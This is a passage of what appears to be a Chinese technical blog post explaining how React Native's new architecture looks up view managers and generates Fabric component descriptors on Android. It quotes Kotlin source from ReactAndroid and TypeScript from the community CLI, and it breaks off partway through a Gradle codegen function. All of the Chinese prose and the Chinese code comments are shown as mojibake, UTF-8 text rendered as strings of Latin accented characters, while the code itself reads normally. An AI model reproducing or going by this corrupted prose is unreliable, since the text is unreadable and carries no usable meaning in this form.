<p>è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œ<code>createShadowNode</code>æ–¹æ³•åªæ˜¯åˆ›å»ºäº†è™šæ‹Ÿçš„<strong>ShadowNode</strong>ï¼Œå¹¶æ²¡æœ‰åˆ›å»ºçœŸæ­£çš„åŸç”Ÿè§†å›¾ã€‚ShadowNodeæ˜¯Fabricä¸­çš„è™šæ‹ŸDOMèŠ‚ç‚¹ï¼Œç”¨äºå¸ƒå±€è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´å½“å®Œæˆå¸ƒå±€å’Œdiffè®¡ç®—åï¼Œä¼šç”ŸæˆMountItemæŒ‡ä»¤ã€‚</p>
<h5 data-id="heading-6">Kotlinå±‚</h5>
<p>åœ¨å‰é¢<strong>å¯åŠ¨æ¸²æŸ“</strong>ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬æœ‰åˆ†æåˆ°<code>createViewUnsafe</code>æ–¹æ³•ï¼Œå›é¡¾ä¸€ä¸‹å®‰å“åŸç”Ÿç»„ä»¶çš„æŸ¥æ‰¾ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">ViewManager viewManager = mViewManagerRegistry.<span class="hljs-keyword">get</span>(componentName);
</code></pre>
<p>è·Ÿè¸ªæºç <code>react-native/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/uimanager/ViewManagerRegistry.kt</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  <span class="hljs-meta">@Synchronized</span>
  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">get</span><span class="hljs-params">(className: <span class="hljs-type">String</span>)</span></span>: ViewManager&lt;*, *&gt; {
    <span class="hljs-comment">// 1. Try to get the manager without the prefix.</span>
    viewManagersMap[className]?.let {
      <span class="hljs-keyword">return</span> it
    }

    <span class="hljs-comment">// 2. Try to get the manager with the RCT prefix.</span>
    <span class="hljs-keyword">val</span> rctViewManagerName = <span class="hljs-string">"RCT<span class="hljs-variable">$className</span>"</span>
    viewManagersMap[rctViewManagerName]?.let {
      <span class="hljs-keyword">return</span> it
    }

    <span class="hljs-keyword">if</span> (viewManagerResolver != <span class="hljs-literal">null</span>) {

      <span class="hljs-comment">// 1. Try to get the manager without the prefix.</span>
      <span class="hljs-keyword">val</span> resolvedManager = getViewManagerFromResolver(className)
      <span class="hljs-keyword">if</span> (resolvedManager != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> resolvedManager
      }

      <span class="hljs-comment">// 2. Try to get the manager with the RCT prefix.</span>
      <span class="hljs-keyword">val</span> rctResolvedManager = getViewManagerFromResolver(rctViewManagerName)
      <span class="hljs-keyword">if</span> (rctResolvedManager != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> rctResolvedManager
      }

      <span class="hljs-keyword">throw</span> IllegalViewOperationException(
          <span class="hljs-string">"Can't find ViewManager '<span class="hljs-variable">$className</span>' nor '<span class="hljs-variable">$rctViewManagerName</span>' in ViewManagerRegistry, "</span> +
              <span class="hljs-string">"existing names are: <span class="hljs-subst">${viewManagerResolver.getViewManagerNames()}</span>"</span>
      )
    }

    <span class="hljs-keyword">throw</span> IllegalViewOperationException(<span class="hljs-string">"No ViewManager found for class <span class="hljs-variable">$className</span>"</span>)
  }

  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getViewManagerFromResolver</span><span class="hljs-params">(className: <span class="hljs-type">String</span>)</span></span>: ViewManager&lt;*, *&gt;? {
    <span class="hljs-keyword">val</span> viewManager = viewManagerResolver?.getViewManager(className)
    <span class="hljs-keyword">if</span> (viewManager != <span class="hljs-literal">null</span>) {
      viewManagersMap[className] = viewManager
    }
    <span class="hljs-keyword">return</span> viewManager
  }
</code></pre>
<p>æ–°æ¶æ„çš„æƒ…å†µä¸‹ï¼Œæ˜¯é€šè¿‡<code>getViewManagerFromResolver</code>æ–¹æ³•æ¥æŸ¥æ‰¾ï¼Œå…¶ä¸­<code>viewManagerResolver</code>çš„ç±»å‹æ˜¯<code>BridgelessViewManagerResolver</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œå®šä¹‰åœ¨<code>ReactInstance.kt</code>æ–‡ä»¶ä¸­ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BridgelessViewManagerResolver</span>(
      <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> reactPackages: List&lt;ReactPackage&gt;,
      <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: BridgelessReactContext,
  ) : ViewManagerResolver {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lazyViewManagerMap: MutableMap&lt;String, ViewManager&lt;*, *&gt;&gt; = HashMap()

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getViewManager</span><span class="hljs-params">(viewManagerName: <span class="hljs-type">String</span>)</span></span>: ViewManager&lt;*, *&gt;? {
      <span class="hljs-comment">// ä»æ‡’åŠ è½½åŒ…ä¸­æŸ¥æ‰¾</span>
      <span class="hljs-keyword">val</span> viewManager = getLazyViewManager(viewManagerName)
      <span class="hljs-keyword">if</span> (viewManager != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> viewManager
      }
      <span class="hljs-comment">// å¦‚æœé€šè¿‡å»¶è¿ŸåŠ è½½åœ¨æ‰€æœ‰ React åŒ…ä¸­éƒ½æ‰¾ä¸åˆ°è§†å›¾ç®¡ç†å™¨ï¼Œåˆ™å›é€€åˆ°é»˜è®¤å®ç°ï¼šç«‹å³åˆå§‹åŒ–æ‰€æœ‰è§†å›¾ç®¡ç†å™¨</span>
      <span class="hljs-keyword">return</span> eagerViewManagerMap[viewManagerName]
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> _eagerViewManagerMap: Map&lt;String, ViewManager&lt;*, *&gt;&gt;

    <span class="hljs-meta">@get:Synchronized</span>
    <span class="hljs-keyword">val</span> eagerViewManagerMap: Map&lt;String, ViewManager&lt;*, *&gt;&gt;
      <span class="hljs-keyword">get</span>() {
        <span class="hljs-keyword">if</span> (::_eagerViewManagerMap.isInitialized) {
          <span class="hljs-keyword">return</span> _eagerViewManagerMap
        }

        <span class="hljs-keyword">val</span> viewManagerMap: MutableMap&lt;String, ViewManager&lt;*, *&gt;&gt; = HashMap()
        <span class="hljs-keyword">for</span> (reactPackage <span class="hljs-keyword">in</span> reactPackages) {
          <span class="hljs-keyword">if</span> (reactPackage <span class="hljs-keyword">is</span> ViewManagerOnDemandReactPackage) {
            <span class="hljs-keyword">continue</span>
          }

          <span class="hljs-keyword">val</span> viewManagersInPackage = reactPackage.createViewManagers(context)
          <span class="hljs-keyword">for</span> (viewManager <span class="hljs-keyword">in</span> viewManagersInPackage) {
            <span class="hljs-comment">// TODO(T173624687): Should we throw/warn when the same view manager name is registered</span>
            <span class="hljs-comment">// twice?</span>
            viewManagerMap[viewManager.name] = viewManager
          }
        }

        _eagerViewManagerMap = viewManagerMap
        <span class="hljs-keyword">return</span> viewManagerMap
      }

    <span class="hljs-meta">@Synchronized</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getLazyViewManager</span><span class="hljs-params">(viewManagerName: <span class="hljs-type">String</span>)</span></span>: ViewManager&lt;*, *&gt;? {
      <span class="hljs-comment">// å…ˆæŸ¥ç¼“å­˜ </span>
      <span class="hljs-keyword">if</span> (lazyViewManagerMap.containsKey(viewManagerName)) {
        <span class="hljs-keyword">return</span> lazyViewManagerMap[viewManagerName]
      }

      <span class="hljs-comment">// ç¼“å­˜æœªå‘½ä¸­åˆ™éå†æ‰€æœ‰ reactPackagesï¼Œè°ƒç”¨ createViewManager(name) åˆ›å»º</span>
      <span class="hljs-keyword">for</span> (reactPackage <span class="hljs-keyword">in</span> reactPackages) {
        <span class="hljs-keyword">if</span> (reactPackage <span class="hljs-keyword">is</span> ViewManagerOnDemandReactPackage) {
          <span class="hljs-keyword">val</span> viewManager = reactPackage.createViewManager(context, viewManagerName)
          <span class="hljs-keyword">if</span> (viewManager != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// TODO(T173624687): Should we throw/warn when the same view manager name is registered</span>
            <span class="hljs-comment">// twice?</span>
            lazyViewManagerMap[viewManagerName] = viewManager
            <span class="hljs-keyword">return</span> viewManager
          }
        }
      }

      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }

    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
  }
</code></pre>
<h4 data-id="heading-7">æ³¨å†Œç»„ä»¶</h4>
<h5 data-id="heading-8">JSå·¥å…·</h5>
<p>React Nativeæ–°æ¶æ„ä½¿ç”¨äº†å¾ˆå¤šä»£ç ç”Ÿæˆå·¥å…·ï¼Œä»¥è‡´äºæˆäº†é»‘ç®±æ“ä½œï¼Œè¿™å¯¹äºTurbo Moduleå’ŒFabricç»„ä»¶çš„æ³¨å†Œæµç¨‹é€ æˆäº†ç†è§£ä¸Šçš„å›°éš¾ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä¸å¾—ä¸ç ”ç©¶è¿™äº›CLIå·¥å…·ã€‚é¦–å…ˆç ”ç©¶<code>@react-native-community/cli</code>å·¥å…·ï¼Œæºç  <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Freact-native-community%2Fcli" target="_blank" title="https://github.com/react-native-community/cli" ref="nofollow noopener noreferrer">cli</a>ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯<code>v20.0.2</code>ã€‚</p>
<p>æŸ¥çœ‹æºç <code>cli/packages/cli-config-android/src/config/index.ts</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dependencyConfig</span>(<span class="hljs-params">
  root: <span class="hljs-built_in">string</span>,
  userConfig: AndroidDependencyParams | <span class="hljs-literal">null</span> = {},
</span>): <span class="hljs-title class_">AndroidDependencyConfig</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">if</span> (userConfig === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-keyword">const</span> src = userConfig.<span class="hljs-property">sourceDir</span> || <span class="hljs-title function_">findAndroidDir</span>(root);

  <span class="hljs-keyword">if</span> (!src) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-keyword">const</span> sourceDir = path.<span class="hljs-title function_">join</span>(root, src);
  <span class="hljs-keyword">const</span> manifestPath = userConfig.<span class="hljs-property">manifestPath</span>
    ? path.<span class="hljs-title function_">join</span>(sourceDir, userConfig.<span class="hljs-property">manifestPath</span>)
    : <span class="hljs-title function_">findManifest</span>(sourceDir);
  <span class="hljs-keyword">const</span> buildGradlePath = <span class="hljs-title function_">findBuildGradle</span>(sourceDir, <span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> isPureCxxDependency =
    userConfig.<span class="hljs-property">cxxModuleCMakeListsModuleName</span> != <span class="hljs-literal">null</span> &amp;&amp;
    userConfig.<span class="hljs-property">cxxModuleCMakeListsPath</span> != <span class="hljs-literal">null</span> &amp;&amp;
    userConfig.<span class="hljs-property">cxxModuleHeaderName</span> != <span class="hljs-literal">null</span> &amp;&amp;
    !manifestPath &amp;&amp;
    !buildGradlePath;

  <span class="hljs-keyword">if</span> (!manifestPath &amp;&amp; !buildGradlePath &amp;&amp; !isPureCxxDependency) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-keyword">let</span> packageImportPath = <span class="hljs-literal">null</span>,
    packageInstance = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">if</span> (!isPureCxxDependency) {
    <span class="hljs-keyword">const</span> packageName =
      userConfig.<span class="hljs-property">packageName</span> || <span class="hljs-title function_">getPackageName</span>(manifestPath, buildGradlePath);
    <span class="hljs-keyword">const</span> packageClassName = <span class="hljs-title function_">findPackageClassName</span>(sourceDir);

    <span class="hljs-comment">/**
     * This module has no package to export
     */</span>
    <span class="hljs-keyword">if</span> (!packageClassName) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    packageImportPath =
      userConfig.<span class="hljs-property">packageImportPath</span> ||
      <span class="hljs-string">`import <span class="hljs-subst">${packageName}</span>.<span class="hljs-subst">${packageClassName}</span>;`</span>;

    packageInstance = userConfig.<span class="hljs-property">packageInstance</span> || <span class="hljs-string">`new <span class="hljs-subst">${packageClassName}</span>()`</span>;
  }

  <span class="hljs-keyword">const</span> buildTypes = userConfig.<span class="hljs-property">buildTypes</span> || [];
  <span class="hljs-keyword">const</span> dependencyConfiguration = userConfig.<span class="hljs-property">dependencyConfiguration</span>;
  <span class="hljs-keyword">const</span> libraryName =
    userConfig.<span class="hljs-property">libraryName</span> || <span class="hljs-title function_">findLibraryName</span>(root, sourceDir);
  <span class="hljs-keyword">const</span> componentDescriptors =
    userConfig.<span class="hljs-property">componentDescriptors</span> || <span class="hljs-title function_">findComponentDescriptors</span>(root);
  <span class="hljs-keyword">let</span> cmakeListsPath = userConfig.<span class="hljs-property">cmakeListsPath</span>
    ? path.<span class="hljs-title function_">join</span>(sourceDir, userConfig.<span class="hljs-property">cmakeListsPath</span>)
    : path.<span class="hljs-title function_">join</span>(sourceDir, <span class="hljs-string">'build/generated/source/codegen/jni/CMakeLists.txt'</span>);
  <span class="hljs-keyword">const</span> cxxModuleCMakeListsModuleName =
    userConfig.<span class="hljs-property">cxxModuleCMakeListsModuleName</span> || <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">const</span> cxxModuleHeaderName = userConfig.<span class="hljs-property">cxxModuleHeaderName</span> || <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">let</span> cxxModuleCMakeListsPath = userConfig.<span class="hljs-property">cxxModuleCMakeListsPath</span>
    ? path.<span class="hljs-title function_">join</span>(sourceDir, userConfig.<span class="hljs-property">cxxModuleCMakeListsPath</span>)
    : <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">if</span> (process.<span class="hljs-property">platform</span> === <span class="hljs-string">'win32'</span>) {
    cmakeListsPath = cmakeListsPath.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">'/'</span>);
    <span class="hljs-keyword">if</span> (cxxModuleCMakeListsPath) {
      cxxModuleCMakeListsPath = cxxModuleCMakeListsPath.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">'/'</span>);
    }
  }

  <span class="hljs-keyword">return</span> {
    sourceDir,
    packageImportPath,
    packageInstance,
    buildTypes,
    dependencyConfiguration,
    libraryName,
    componentDescriptors,
    cmakeListsPath,
    cxxModuleCMakeListsModuleName,
    cxxModuleCMakeListsPath,
    cxxModuleHeaderName,
    isPureCxxDependency,
  };
}
</code></pre>
<p>æ­¤<code>dependencyConfig</code>å‡½æ•°éå¸¸é‡è¦ï¼Œå®ƒä¸»è¦ç”¨äºç”Ÿæˆ<code>example/android/build/generated/autolinking/autolinking.json</code>æ–‡ä»¶ã€‚<code>autolinking.json</code>æ–‡ä»¶æˆ‘ä»¬åœ¨å‰é¢çš„TurboModuleçš„æ–‡ç« å·²ç»ä»‹ç»è¿‡äº†ï¼Œå…¶ä¸­çš„ä¿¡æ¯æ˜¯æŒ‡å¯¼ä»£ç ç”Ÿæˆçš„å…³é”®ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨<code>componentDescriptors</code>å­—æ®µçš„ç”Ÿæˆï¼Œå› ä¸ºå®ƒæ˜¯Fabricç»„ä»¶ä»£ç ç”Ÿæˆçš„èµ·å§‹ã€‚</p>
<p>ç»„ä»¶å¼€å‘è€…é€šå¸¸å¹¶ä¸ä¼šåœ¨<code>react-native.config.js</code>æ–‡ä»¶ä¸­ä¸»åŠ¨é…ç½®<code>componentDescriptors</code>å­—æ®µï¼Œä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å€¼ï¼Œé‚£ä¹ˆå°±è¦æŸ¥çœ‹ä¸€ä¸‹<code>findComponentDescriptors</code>å‡½æ•°çš„å®ç°é€»è¾‘äº†ï¼Œæºç <code>cli/packages/cli-config-android/src/config/findComponentDescriptors.ts</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">findComponentDescriptors</span>(<span class="hljs-params">packageRoot: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">let</span> jsSrcsDir = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> packageJson = fs.<span class="hljs-title function_">readFileSync</span>(
      path.<span class="hljs-title function_">join</span>(packageRoot, <span class="hljs-string">'package.json'</span>),
      <span class="hljs-string">'utf8'</span>,
    );
    jsSrcsDir = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(packageJson).<span class="hljs-property">codegenConfig</span>.<span class="hljs-property">jsSrcsDir</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// no jsSrcsDir, continue with default glob pattern</span>
  }
  <span class="hljs-keyword">const</span> globPattern = jsSrcsDir
    ? <span class="hljs-string">`<span class="hljs-subst">${jsSrcsDir}</span>/**/*{.js,.jsx,.ts,.tsx}`</span>
    : <span class="hljs-string">'**/*{.js,.jsx,.ts,.tsx}'</span>;
  <span class="hljs-keyword">const</span> files = glob.<span class="hljs-title function_">sync</span>(globPattern, {
    <span class="hljs-attr">cwd</span>: <span class="hljs-title function_">unixifyPaths</span>(packageRoot),
    <span class="hljs-attr">onlyFiles</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">ignore</span>: [<span class="hljs-string">'**/node_modules/**'</span>],
  });
  <span class="hljs-keyword">const</span> codegenComponent = files
    .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">filePath</span>) =&gt;</span>
      fs.<span class="hljs-title function_">readFileSync</span>(path.<span class="hljs-title function_">join</span>(packageRoot, filePath), <span class="hljs-string">'utf8'</span>),
    )
    .<span class="hljs-title function_">map</span>(extractComponentDescriptors)
    .<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>);

  <span class="hljs-comment">// Filter out duplicates as it happens that libraries contain multiple outputs due to package publishing.</span>
  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> consider using "codegenConfig" to avoid this.</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(codegenComponent <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>[]));
}
</code></pre>
<p>è¿™é‡Œä¸»è¦é€»è¾‘å…¶å®æ˜¯ä»<code>package.json</code>ä¸­è·å–åˆ°<code>jsSrcsDir</code>é…ç½®ï¼Œä»è€Œå®šä½åˆ°æºç æ‰€åœ¨ç›®å½•ã€‚æˆ‘ä»¬å…³æ³¨çš„æ˜¯<code>codegenComponent</code>çš„ç”Ÿæˆï¼Œæ­¤å¤„æ˜¯é€šè¿‡è¯»å–æ¯ä¸ªæºæ–‡ä»¶å†…å®¹ï¼Œç„¶åè°ƒç”¨ <code>extractComponentDescriptors</code> æå–ç»„ä»¶æè¿°ç¬¦ã€‚ç»§ç»­æŸ¥çœ‹<code>cli/packages/cli-config-android/src/config/extractComponentDescriptors.ts</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CODEGEN_NATIVE_COMPONENT_REGEX</span> =
  <span class="hljs-regexp">/codegenNativeComponent(&lt;.*&gt;)?\s*\(\s*["'`](\w+)["'`](,?[\s\S]+interfaceOnly:\s*(\w+))?/m</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">extractComponentDescriptors</span>(<span class="hljs-params">contents: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> match = contents.<span class="hljs-title function_">match</span>(<span class="hljs-variable constant_">CODEGEN_NATIVE_COMPONENT_REGEX</span>);
  <span class="hljs-keyword">if</span> (!(match?.[<span class="hljs-number">4</span>] === <span class="hljs-string">'true'</span>) &amp;&amp; match?.[<span class="hljs-number">2</span>]) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${match[<span class="hljs-number">2</span>]}</span>ComponentDescriptor`</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>åˆ°è¿™é‡Œå°±å¾ˆæ¸…æ¥šäº†ï¼Œæ‰«ææ‰€æœ‰æºç ï¼Œä½¿ç”¨æ­£åˆ™æ‰¾åˆ°æˆ‘ä»¬åœ¨å£°æ˜ç»„ä»¶ä¸€èŠ‚ä¸­æåˆ°çš„<code>export default codegenNativeComponent&lt;NativeProps&gt;('CustomviewView');</code>è¿™è¡Œä»£ç ï¼Œè¿™é‡Œçš„æ­£åˆ™å°±æ˜¯åŒ¹é…å…³é”®å­—<code>codegenNativeComponent</code>ã€‚è¿™é‡Œçš„<code>match?.[2]</code>å°±æ˜¯æå‰å‡ºç»„ä»¶åï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¤ºä¾‹ä¸­çš„<code>CustomviewView</code>ã€‚æœ€ç»ˆè¿”å›çš„å­—ç¬¦ä¸²æ˜¯æ‹¼æ¥åçš„ï¼Œè¿™é‡Œå°±æ˜¯<code>CustomviewViewComponentDescriptor</code>ã€‚ä¹Ÿå°±æ˜¯è¯´<code>componentDescriptors</code>å­—æ®µçš„é»˜è®¤å€¼æ˜¯<code>CustomviewViewComponentDescriptor</code>ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å›é¡¾å‰æ–‡<a href="https://juejin.cn/post/7595178023256211475" target="_blank" title="https://juejin.cn/post/7595178023256211475">ã€ŠReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æã€‹</a>ï¼Œå…¶ä¸­æåˆ°ä½†ç•¥è¿‡çš„React Gradleè„šæœ¬çš„<code>configureCodegen</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureCodegen</span><span class="hljs-params">(
      project: <span class="hljs-type">Project</span>,
      localExtension: <span class="hljs-type">ReactExtension</span>,
      rootExtension: <span class="hljs-type">PrivateReactExtension</span>,
      isLibrary: <span class="hljs-type">Boolean</span>,
  )</span></span> {
    <span class="hljs-comment">// é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½® Codegen çš„è¾“å‡ºç›®å½•</span>
    <span class="hljs-keyword">val</span> generatedSrcDir: Provider&lt;Directory&gt; =
        project.layout.buildDirectory.dir(<span class="hljs-string">"generated/source/codegen"</span>)

    <span class="hljs-comment">// æˆ‘ä»¬ä¸º jsRootDirï¼ˆJSæ ¹ç›®å½•ï¼‰æŒ‡å®šé»˜è®¤å€¼ï¼ˆçº¦å®šï¼‰ã€‚</span>
    <span class="hljs-comment">// å¯¹äº App æ¥è¯´æ˜¯æ ¹æ–‡ä»¶å¤¹ï¼ˆå³ Gradle é¡¹ç›®çš„ ../../ï¼‰</span>
    <span class="hljs-comment">// å¯¹äº Library æ¥è¯´æ˜¯åŒ…æ–‡ä»¶å¤¹ï¼ˆå³ Gradle é¡¹ç›®çš„ ../ï¼‰</span>
    <span class="hljs-keyword">if</span> (isLibrary) {
      localExtension.jsRootDir.convention(project.layout.projectDirectory.dir(<span class="hljs-string">"../"</span>))
    } <span class="hljs-keyword">else</span> {
      localExtension.jsRootDir.convention(localExtension.root)
    }

    <span class="hljs-comment">// æˆ‘ä»¬åˆ›å»ºä»»åŠ¡ä»¥ä» JS æ–‡ä»¶ç”Ÿæˆ Schema</span>
    <span class="hljs-keyword">val</span> generateCodegenSchemaTask =
        project.tasks.register(
            <span class="hljs-string">"generateCodegenSchemaFromJavaScript"</span>,
            GenerateCodegenSchemaTask::<span class="hljs-keyword">class</span>.java,
        ) { it -&gt;
          it.nodeExecutableAndArgs.<span class="hljs-keyword">set</span>(rootExtension.nodeExecutableAndArgs)
          it.codegenDir.<span class="hljs-keyword">set</span>(rootExtension.codegenDir)
          it.generatedSrcDir.<span class="hljs-keyword">set</span>(generatedSrcDir)
          it.nodeWorkingDir.<span class="hljs-keyword">set</span>(project.layout.projectDirectory.asFile.absolutePath)

          <span class="hljs-comment">// æˆ‘ä»¬åœ¨é…ç½®é˜¶æ®µè¯»å– package.jsonï¼Œä»¥ä¾¿æ­£ç¡®åœ°å¡«å……æ­¤ä»»åŠ¡çš„ `jsRootDir` @Input å±æ€§</span>
          <span class="hljs-comment">// ä»¥åŠ onlyIf æ¡ä»¶ã€‚å› æ­¤ï¼ŒparsePackageJson åº”è¯¥åœ¨è¿™ä¸ª lambda è¡¨è¾¾å¼å†…éƒ¨è¢«è°ƒç”¨ã€‚</span>
          <span class="hljs-keyword">val</span> packageJson = findPackageJsonFile(project, rootExtension.root)
          <span class="hljs-keyword">val</span> parsedPackageJson = packageJson?.let { JsonUtils.fromPackageJson(it) }

          <span class="hljs-keyword">val</span> jsSrcsDirInPackageJson = parsedPackageJson?.codegenConfig?.jsSrcsDir
          <span class="hljs-keyword">val</span> includesGeneratedCode =
              parsedPackageJson?.codegenConfig?.includesGeneratedCode ?: <span class="hljs-literal">false</span>
          <span class="hljs-keyword">if</span> (jsSrcsDirInPackageJson != <span class="hljs-literal">null</span>) {
            it.jsRootDir.<span class="hljs-keyword">set</span>(File(packageJson.parentFile, jsSrcsDirInPackageJson))
          } <span class="hljs-keyword">else</span> {
            it.jsRootDir.<span class="hljs-keyword">set</span>(localExtension.jsRootDir)
          }
          it.jsInputFiles.<span class="hljs-keyword">set</span>(
              project.fileTree(it.jsRootDir) { tree -&gt;
                tree.include(<span class="hljs-string">"**/*.js"</span>)
                tree.include(<span class="hljs-string">"**/*.jsx"</span>)
                tree.include(<span class="hljs-string">"**/*.ts"</span>)
                tree.include(<span class="hljs-string">"**/*.tsx"</span>)

                tree.exclude(<span class="hljs-string">"node_modules/**/*"</span>)
                tree.exclude(<span class="hljs-string">"**/*.d.ts"</span>)
                <span class="hljs-comment">// æˆ‘ä»¬å¸Œæœ›æ’é™¤ build ç›®å½•ï¼Œä»¥é¿å…åœ¨æ‰§è¡Œè§„é¿æ£€æŸ¥æ—¶é€‰ä¸­å®ƒä»¬</span>
                tree.exclude(<span class="hljs-string">"**/build/**/*"</span>)
              }
          )

          <span class="hljs-keyword">val</span> needsCodegenFromPackageJson = project.needsCodegenFromPackageJson(rootExtension.root)
          it.onlyIf { (isLibrary || needsCodegenFromPackageJson) &amp;&amp; !includesGeneratedCode }
        }

    <span class="hljs-comment">// æˆ‘ä»¬åˆ›å»ºä»»åŠ¡ä»¥ä» Schema ç”Ÿæˆ Java ä»£ç </span>
    <span class="hljs-keyword">val</span> generateCodegenArtifactsTask =
        project.tasks.register(
            <span class="hljs-string">"generateCodegenArtifactsFromSchema"</span>,
            GenerateCodegenArtifactsTask::<span class="hljs-keyword">class</span>.java,
        ) { task -&gt;
          task.dependsOn(generateCodegenSchemaTask)
          task.reactNativeDir.<span class="hljs-keyword">set</span>(rootExtension.reactNativeDir)
          task.nodeExecutableAndArgs.<span class="hljs-keyword">set</span>(rootExtension.nodeExecutableAndArgs)
          task.generatedSrcDir.<span class="hljs-keyword">set</span>(generatedSrcDir)
          task.packageJsonFile.<span class="hljs-keyword">set</span>(findPackageJsonFile(project, rootExtension.root))
          task.codegenJavaPackageName.<span class="hljs-keyword">set</span>(localExtension.codegenJavaPackageName)
          task.libraryName.<span class="hljs-keyword">set</span>(localExtension.libraryName)
          task.nodeWorkingDir.<span class="hljs-keyword">set</span>(project.layout.projectDirectory.asFile.absolutePath)

          <span class="hljs-comment">// è¯·æ³¨æ„ï¼ŒappNeedsCodegen ä¼šè§¦å‘åœ¨é…ç½®é˜¶æ®µè¯»å– package.jsonï¼Œ</span>
          <span class="hljs-comment">// å› ä¸ºæˆ‘ä»¬éœ€è¦å¡«å……æ­¤ä»»åŠ¡çš„ onlyIf æ¡ä»¶ã€‚</span>
          <span class="hljs-comment">// å› æ­¤ï¼ŒappNeedsCodegen éœ€è¦åœ¨è¿™ä¸ª lambda è¡¨è¾¾å¼å†…éƒ¨è¢«è°ƒç”¨</span>
          <span class="hljs-keyword">val</span> needsCodegenFromPackageJson = project.needsCodegenFromPackageJson(rootExtension.root)
          <span class="hljs-keyword">val</span> packageJson = findPackageJsonFile(project, rootExtension.root)
          <span class="hljs-keyword">val</span> parsedPackageJson = packageJson?.let { JsonUtils.fromPackageJson(it) }
          <span class="hljs-keyword">val</span> includesGeneratedCode =
              parsedPackageJson?.codegenConfig?.includesGeneratedCode ?: <span class="hljs-literal">false</span>
          task.onlyIf { (isLibrary || needsCodegenFromPackageJson) &amp;&amp; !includesGeneratedCode }
        }

    <span class="hljs-comment">// æˆ‘ä»¬æ›´æ–° Android é…ç½®ä»¥åŒ…å«ç”Ÿæˆçš„æºç </span>
    <span class="hljs-comment">// è¿™ç›¸å½“äºä»¥ä¸‹çš„ DSLï¼š</span>
    <span class="hljs-comment">//</span>
